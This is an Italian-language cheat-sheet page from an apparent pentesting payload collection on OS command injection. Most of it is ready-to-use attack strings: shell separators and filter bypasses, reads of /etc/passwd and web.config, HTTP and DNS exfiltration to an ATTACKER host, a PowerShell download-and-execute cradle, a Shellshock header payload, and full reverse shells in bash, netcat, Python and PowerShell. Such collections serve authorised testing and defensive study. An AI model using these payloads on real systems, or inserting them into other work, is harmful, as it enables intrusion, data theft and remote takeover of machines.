# 💻 Payload di command injection

<!-- language-home-navigation -->
[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](Command-Injection.tr.md) • [🇬🇷 Ελληνικά](Command-Injection.el.md)

> **Nota sugli esempi originali:** I separatori dipendono dalla shell e dal contesto: il punto e virgola non è un separatore generale in cmd.exe. Le sequenze con codifica URL richiedono una fase di decodifica appropriata. Le opzioni di Netcat e le funzioni disponibili variano; gli esempi originali sono conservati senza correzioni eseguibili.


```
 ██████╗ ███████╗     ██████╗ ██████╗ ███╗   ███╗███╗   ███╗ █████╗ ███╗   ██╗██████╗ 
██╔═══██╗██╔════╝    ██╔════╝██╔═══██╗████╗ ████║████╗ ████║██╔══██╗████╗  ██║██╔══██╗
██║   ██║███████╗    ██║     ██║   ██║██╔████╔██║██╔████╔██║███████║██╔██╗ ██║██║  ██║
██║   ██║╚════██║    ██║     ██║   ██║██║╚██╔╝██║██║╚██╔╝██║██╔══██║██║╚██╗██║██║  ██║
╚██████╔╝███████║    ╚██████╗╚██████╔╝██║ ╚═╝ ██║██║ ╚═╝ ██║██║  ██║██║ ╚████║██████╔╝
 ╚═════╝ ╚══════╝     ╚═════╝ ╚═════╝ ╚═╝     ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ 
██╗███╗   ██╗     ██╗███████╗ ██████╗████████╗██╗ ██████╗ ███╗   ██╗                   
██║████╗  ██║     ██║██╔════╝██╔════╝╚══██╔══╝██║██╔═══██╗████╗  ██║                   
██║██╔██╗ ██║     ██║█████╗  ██║        ██║   ██║██║   ██║██╔██╗ ██║                   
██║██║╚██╗██║██   ██║██╔══╝  ██║        ██║   ██║██║   ██║██║╚██╗██║                   
██║██║ ╚████║╚█████╔╝███████╗╚██████╗   ██║   ██║╚██████╔╝██║ ╚████║                   
╚═╝╚═╝  ╚═══╝ ╚════╝ ╚══════╝ ╚═════╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝                   
```

---

## 🎯 Separatori dei comandi

### Linux/Unix
```bash
;       # Punto e virgola - esegui dopo
|       # Pipe - passa l’output al comando successivo
||      # OR - esegui se il primo fallisce
&       # Background - esegui in secondo piano
&&      # AND - esegui se il primo riesce
`cmd`   # Apici inversi - sostituzione di comando
$(cmd)  # Dollaro - sostituzione di comando
\n      # Nuova riga - separa i comandi
```

### Windows
```cmd
;       # Funziona in alcuni contesti
|       # Pipe
||      # OR
&       # Esegui entrambi
&&      # AND
\n      # Nuova riga
%0a     # Nuova riga con codifica URL
```

---

## 💉 Payload di base

### Test semplice
```bash
; id
; whoami
| id
| whoami
|| id
|| whoami
& id
& whoami
&& id
&& whoami
`id`
$(id)
```

### Con codifica URL
```
%3B+id               # ; id
%7C+id               # | id
%7C%7C+id            # || id
%26+id               # & id
%26%26+id            # && id
%0A+id               # nuova riga + id
```

---

## 🔥 Command injection blind

### Rilevamento basato sui tempi
```bash
# Comandi di attesa
; sleep 5
| sleep 5
|| sleep 5
& sleep 5
&& sleep 5
`sleep 5`
$(sleep 5)

# Windows
; ping -n 5 127.0.0.1
| timeout 5
```

### Rilevamento basato su DNS
```bash
# Uso di nslookup
; nslookup BURP_COLLAB
| nslookup BURP_COLLAB
`nslookup BURP_COLLAB`
$(nslookup BURP_COLLAB)

# Uso di curl/wget
; curl http://BURP_COLLAB
; wget http://BURP_COLLAB
$(curl http://ATTACKER/?data=$(whoami))
```

### Esfiltrazione basata su HTTP
```bash
; curl http://ATTACKER/$(whoami)
; curl http://ATTACKER/?d=$(cat /etc/passwd | base64)
; wget http://ATTACKER/$(hostname)
$(curl http://ATTACKER/?id=$(id))
`curl http://ATTACKER/?user=$(whoami)`
```

---

## 🛡 Tecniche di aggiramento dei filtri

### Aggiramento del filtro sugli spazi
```bash
# Uso di $IFS (Internal Field Separator)
;cat${IFS}/etc/passwd
;cat$IFS/etc/passwd
;{cat,/etc/passwd}

# Uso delle tabulazioni
;cat	/etc/passwd

# Uso delle parentesi graffe
{cat,/etc/passwd}
```

### Aggiramento dei filtri sulle parole chiave
```bash
# Suddivisione dei comandi
w'h'oami
w"h"oami
who$@ami
who\ami

# Uso dei caratteri jolly
/bin/ca? /etc/passwd
/bin/c?t /etc/passwd
/b??/c?t /etc/passwd

# Uso delle variabili
$u; cat /etc/passwd
test=cat; $test /etc/passwd

# Codifica esadecimale
echo -e "\x69\x64" | sh    # id
```

### Aggiramento dei filtri sui caratteri speciali
```bash
# Uso di delimitatori diversi
;{cat,/etc/passwd}
;cat</etc/passwd
;cat$IFS/etc/passwd

# Injection di interruzioni di riga
%0aid
%0Acat%20/etc/passwd

# Uso dei commenti
; id #
| id #
```

---

## 🐧 Payload Linux

### Lettura dei file
```bash
; cat /etc/passwd
; head /etc/passwd
; tail /etc/passwd
; less /etc/passwd
; more /etc/passwd
; nl /etc/passwd
; sort /etc/passwd
; uniq /etc/passwd
; strings /etc/passwd
; od -c /etc/passwd
; xxd /etc/passwd
; base64 /etc/passwd
```

### Esecuzione di comandi
```bash
; id
; whoami
; uname -a
; hostname
; pwd
; ls -la
; env
; ps aux
; netstat -an
; ifconfig
; ip addr
```

### Shell inversa (reverse shell)
```bash
; bash -i >& /dev/tcp/ATTACKER/4444 0>&1
; nc -e /bin/sh ATTACKER 4444
; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

---

## 🪟 Payload Windows

### Comandi di base
```cmd
& whoami
& hostname
& ipconfig
& net user
& dir
& type C:\Windows\win.ini
& type C:\Windows\System32\drivers\etc\hosts
```

### Lettura dei file
```cmd
& type C:\Windows\win.ini
& type C:\inetpub\wwwroot\web.config
& more C:\Windows\win.ini
& find "password" C:\path\to\file.txt
```

### PowerShell
```powershell
& powershell -c "whoami"
& powershell -c "Get-Process"
& powershell -c "IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/shell.ps1')"
```

### Shell inversa (reverse shell)
```cmd
& powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## 📝 Punti comuni di injection

```
Parametri URL:
  ?ip=127.0.0.1;id
  ?file=test.txt|id
  ?cmd=ls

Parametri POST:
  filename=test.txt;id
  host=localhost|whoami

Header:
  User-Agent: () { :;}; /bin/bash -c 'cat /etc/passwd'
  X-Forwarded-For: ;id

Nomi dei file caricati:
  test;id;.txt
  test$(id).txt
  test`id`.txt
```

---

## 📋 Checklist dei test

```markdown
□ Prova tutti i separatori dei comandi (; | || & && ` $())
□ Prova le varianti con codifica URL
□ Prova l'injection blind basata sui tempi
□ Prova l'esfiltrazione DNS/HTTP
□ Prova l'aggiramento degli spazi ($IFS, tabulazioni, parentesi graffe)
□ Prova l'aggiramento delle parole chiave (virgolette, caratteri jolly)
□ Prova l'injection di interruzioni di riga (%0a)
□ Verifica quali caratteri sono filtrati
□ Prova comandi sia Linux sia Windows
```

---

## 🔗 Payload correlati

- [Payload LFI](./LFI.it.md)
- [Payload SSTI](./SSTI.it.md)

---

**Torna ai payload:** [💉 Raccolta di payload](../../README.it.md#category-18)
